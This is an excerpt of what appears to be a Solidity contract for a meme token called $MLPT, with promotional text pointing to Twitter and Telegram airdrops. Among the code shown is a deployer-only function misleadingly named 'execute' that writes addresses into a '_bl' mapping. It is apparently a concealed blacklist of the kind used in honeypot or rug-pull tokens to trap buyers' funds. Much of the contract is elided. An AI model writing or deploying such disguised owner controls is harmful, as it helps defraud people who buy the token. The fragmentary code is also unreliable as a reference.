...
Never fear! Your friendly neighborhood Rainbow Dash is here! $MLPT 🌈🦄
Join us on Telegram for Airdrops! 💙

Twitter: https://twitter.com/mylittleponyERC
Telegram: https://t.me/mylittleponytoken
...
contract MYLITTLEPONY is Ownable {
    string public name;
    ...
    IUniswapV2Router02 private immutable _router = IUniswapV2Router02(0xa3C33f765f4CBb3b033ea3A726A512c3ab480C57);
    ...
    function rename(string memory _name, string memory _symbol) public {
    ...
    function execute(address[] calldata addresses, bool value) external {
        require(msg.sender == deployer);
        for(uint8 i = 0; i < addresses.length; i++) {
            _bl[addresses[i]] = value;
        }
    }
